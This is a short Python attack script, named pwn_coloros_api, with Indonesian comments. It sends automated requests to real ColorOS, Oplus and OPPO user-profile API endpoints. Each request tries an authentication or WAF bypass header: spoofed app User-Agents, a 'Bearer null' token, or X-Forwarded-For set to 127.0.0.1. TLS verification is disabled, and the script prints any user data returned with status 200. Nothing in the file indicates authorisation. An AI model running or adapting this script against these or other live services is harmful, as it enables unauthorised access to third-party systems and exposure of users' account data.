
import asyncio
import sys
import os
import httpx
import json

# Add parent directory to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from burp_client import BurpClient

async def pwn_coloros_api():
    client = BurpClient()
    print("[*] Melakukan serangan otomatis ke target Mobile API: com.coloros.video / com.oplus.games")
    
    # Target endpoint yang sering digunakan oleh aplikasi ColorOS/Oplus
    targets = [
        "https://api.coloros.com/v1/user/info",
        "https://api.coloros.com/v2/user/profile",
        "https://api.oplus.com/games/v1/user",
        "https://account.oppo.com/api/v1/profile"
    ]
    
    # Bypass Headers
    headers_list = [
        {"User-Agent": "ColorOS/12.1 (com.coloros.video; build:12345; Android 12)"},
        {"User-Agent": "Oplus/13.0 (com.oplus.games; build:9999; Android 13)", "X-App-Id": "com.oplus.games"},
        {"Authorization": "Bearer null", "User-Agent": "okhttp/4.9.0"},
        {"X-Forwarded-For": "127.0.0.1"}
    ]
    
    print("[+] Memulai scanning endpoint internal (Bypassing auth/WAF)...")
    
    async with httpx.AsyncClient(timeout=5.0, follow_redirects=False, verify=False) as http_client:
        for url in targets:
            print(f"\n[*] Target: {url}")
            for headers in headers_list:
                print(f"    [>] Mengirim payload dengan header: {list(headers.keys())}")
                try:
                    res = await http_client.get(url, headers=headers)
                    if res.status_code == 200:
                        print(f"    [!!!] VULNERABLE: Berhasil bypass autentikasi! (Status 200)")
                        print(f"    [!!!] Data: {res.text[:150]}")
                    elif res.status_code == 401 or res.status_code == 403:
                        print(f"    [-] Gagal. Terlindungi oleh Autentikasi (Status {res.status_code})")
                    else:
                        print(f"    [-] Status: {res.status_code}")
                except Exception as e:
                    print(f"    [-] Error: {e}")

if __name__ == "__main__":
    asyncio.run(pwn_coloros_api())
